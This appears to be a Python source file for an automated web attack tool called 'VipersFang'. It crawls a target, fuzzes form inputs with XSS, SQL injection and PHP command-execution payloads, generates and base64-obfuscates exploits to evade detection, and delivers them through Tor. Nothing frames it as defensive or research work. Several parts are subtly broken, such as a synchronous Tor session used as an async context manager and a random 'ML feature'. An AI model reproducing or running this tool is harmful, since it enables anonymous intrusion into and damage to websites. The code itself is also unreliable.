import aiohttp
import asyncio
from bs4 import BeautifulSoup
import tensorflow as tf
from jinja2 import Environment, FileSystemLoader
import logging
import redis
import base64
import random
from typing import List, Dict, Optional
import torpy.http.requests
import ast

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class VipersFang:
    def __init__(self, target_url: str, tor_enabled: bool = True):
        self.target_url = target_url
        self.tor_enabled = tor_enabled
        self.session = None
        self.redis_client = redis.Redis(host='localhost', port=6379, db=0)
        self.model = tf.keras.models.load_model("exploit_predictor.h5")  # Pre-trained model
        self.env = Environment(loader=FileSystemLoader("templates"))
        self.vuln_types = ["xss", "sqli", "rce"]
        self.fuzz_payloads = {
            "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            "sqli": ["' OR 1=1 --", "1; DROP TABLE users --"],
            "rce": ["<?php system('id'); ?>", "eval('print(1)')"]
        }

    async def init_session(self):
        """Initialize HTTP session with Tor or direct connection."""
        try:
            if self.tor_enabled:
                self.session = torpy.http.requests.requests_session()
                logger.info("Tor session initialized.")
            else:
                self.session = aiohttp.ClientSession()
                logger.info("Direct session initialized.")
        except Exception as e:
            logger.error(f"Session init failed: {e}")
            raise

    async def recon(self) -> Dict[str, List[Dict]]:
        """Crawl target and probe for vulnerabilities."""
        if not self.session:
            await self.init_session()

        endpoints = {}
        async with self.session.get(self.target_url) as resp:
            if resp.status != 200:
                logger.warning(f"Failed to access {self.target_url}: {resp.status}")
                return endpoints
            html = await resp.text()
            soup = BeautifulSoup(html, "html.parser")

            # Find forms and inputs
            for form in soup.find_all("form"):
                action = form.get("action", self.target_url)
                method = form.get("method", "get").lower()
                inputs = [inp.get("name") for inp in form.find_all("input") if inp.get("name")]
                endpoints[action] = [{"method": method, "params": inputs}]

        # Probe endpoints
        for endpoint, details in endpoints.items():
            for detail in details:
                await self.probe_endpoint(endpoint, detail)
        return endpoints

    async def probe_endpoint(self, endpoint: str, detail: Dict):
        """Fuzz endpoint to detect vulnerabilities."""
        method = detail["method"]
        params = detail["params"]
        for vuln_type, payloads in self.fuzz_payloads.items():
            for payload in payloads:
                try:
                    data = {param: payload for param in params}
                    if method == "post":
                        async with self.session.post(endpoint, data=data) as resp:
                            await self.analyze_response(resp, vuln_type, payload)
                    else:
                        async with self.session.get(endpoint, params=data) as resp:
                            await self.analyze_response(resp, vuln_type, payload)
                except Exception as e:
                    logger.error(f"Probe failed for {endpoint}: {e}")

    async def analyze_response(self, resp: aiohttp.ClientResponse, vuln_type: str, payload: str):
        """Check response for signs of vulnerability."""
        text = await resp.text()
        status = resp.status
        if vuln_type == "xss" and payload in text:
            logger.info(f"XSS detected at {resp.url} with {payload}")
            self.redis_client.set(f"vuln:{resp.url}", f"{vuln_type}:{payload}")
        elif vuln_type == "sqli" and ("error" in text.lower() or status == 500):
            logger.info(f"SQLi detected at {resp.url} with {payload}")
            self.redis_client.set(f"vuln:{resp.url}", f"{vuln_type}:{payload}")
        elif vuln_type == "rce" and "uid=" in text:  # Example RCE indicator
            logger.info(f"RCE detected at {resp.url} with {payload}")
            self.redis_client.set(f"vuln:{resp.url}", f"{vuln_type}:{payload}")

    async def generate_exploit(self, vuln_url: str, vuln_type: str, original_payload: str) -> str:
        """Craft a tailored exploit using ML and templates."""
        try:
            template = self.env.get_template(f"{vuln_type}_exploit.j2")
            features = self.extract_features(vuln_url, original_payload)
            success_prob = self.model.predict([features])[0]
            if success_prob < 0.7:
                logger.warning(f"Low exploit success probability: {success_prob}")
                payload = self.obfuscate_payload(original_payload)
            else:
                payload = template.render(target=vuln_url, payload=original_payload)
            return payload
        except Exception as e:
            logger.error(f"Exploit generation failed: {e}")
            return original_payload  # Fallback

    def extract_features(self, url: str, payload: str) -> List[float]:
        """Extract features for ML prediction (simplified)."""
        return [len(payload), url.count("/"), random.uniform(0, 1)]  # Placeholder

    def obfuscate_payload(self, payload: str) -> str:
        """Obfuscate payload to evade detection."""
        if "script" in payload.lower():
            return f"eval(atob('{base64.b64encode(payload.encode()).decode()}'))"
        return payload  # Add more obfuscation logic as needed

    async def deliver_exploit(self, vuln_url: str, payload: str):
        """Deploy the exploit to the target."""
        try:
            async with self.session.get(vuln_url, params={"input": payload}) as resp:
                if resp.status == 200:
                    logger.info(f"Exploit delivered to {vuln_url}: {payload}")
                    self.redis_client.set(f"exploit:{vuln_url}", payload)
                else:
                    logger.warning(f"Delivery failed: {resp.status}")
                    await asyncio.sleep(2)  # Retry after delay
                    await self.deliver_exploit(vuln_url, self.obfuscate_payload(payload))
        except Exception as e:
            logger.error(f"Delivery error: {e}")

    async def run(self):
        """Execute the full exploit pipeline."""
        logger.info(f"Starting Viper’s Fang against {self.target_url}")
        endpoints = await self.recon()
        for endpoint, details in endpoints.items():
            for detail in details:
                for vuln in self.redis_client.keys("vuln:*"):
                    vuln_url = vuln.decode().split(":", 1)[1]
                    vuln_type, original_payload = self.redis_client.get(vuln).decode().split(":", 1)
                    exploit = await self.generate_exploit(vuln_url, vuln_type, original_payload)
                    await self.deliver_exploit(vuln_url, exploit)
        await self.session.close()

if __name__ == "__main__":
    target = "http://example.com/vulnerable"
    viper = VipersFang(target, tor_enabled=True)
    asyncio.run(viper.run())